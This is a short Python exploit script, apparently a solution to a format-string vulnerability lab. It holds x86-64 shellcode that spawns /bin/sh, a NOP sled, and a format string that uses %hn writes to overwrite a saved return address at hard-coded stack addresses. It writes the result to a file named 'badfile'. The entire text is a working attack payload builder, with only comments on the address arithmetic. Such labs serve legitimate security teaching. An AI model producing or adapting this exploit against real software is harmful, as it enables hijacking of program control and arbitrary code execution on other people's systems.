shellcode = (
        "\x48\x31\xc0" # xor rax,rax
        "\x50"         # push rax
        "\x48\xbb\x2f\x2f\x62\x69\x6e" # mov rbx, "//bin/sh"
        "\x2f\x73\x68"
        "\x53"         # push rbx
        "\x48\x89\xe7" # mov rdi, rsp
        "\x48\x89\xc6" # mov rsi, rax
        "\x48\x89\xc2" # mov rdx, rax
        "\xb0\x3b"     # mov al, 0x3b
        "\x0f\x05"     # syscall
).encode("latin-1")

"""
The address of the input array:  0x7fffffffe210
The value of the frame pointer:  0x7fffffffe1e0
The value of the return address: 0x5555555552cf
hi
The value of the return address: 0x5555555552cf
"""

length = 200
# fill with NOPs
payload = bytearray(b"\x90" * length)

#           000000000011111111122222222223333333333344444444
#           123456789012345678901234567890123456789012345678
fmt_str = b"%22$hn%032767x%23$hn%025185x%24$hn%07583x%25$hn "

# need to write to these addresses:
# addr --> value
# 0x7fffffffe1e8 (rbp+8) -->  0xe210 + len of payload + addresses
# 0x7fffffffe1ea (rbp+10) --> 0xffff = 65535
# 0x7fffffffe1ec (rbp+12) --> 0x7fff = 32767
# 0x7fffffffe1ee (rbp+14) --> 0x0000 = 0

payload[0:48] = fmt_str
payload[48:56] = b"\xee\xe1\xff\xff\xff\x7f\x00\x00"
payload[56:64] = b"\xec\xe1\xff\xff\xff\x7f\x00\x00"
payload[64:72] = b"\xe8\xe1\xff\xff\xff\x7f\x00\x00"
payload[72:80] = b"\xea\xe1\xff\xff\xff\x7f\x00\x00"
payload[80:80+len(shellcode)] = shellcode
print(payload)

with open("badfile", "wb") as f:
    f.write(payload)

